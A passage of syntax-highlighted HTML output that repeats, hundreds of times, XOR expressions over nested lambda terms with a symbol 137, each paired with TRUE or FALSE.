class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span 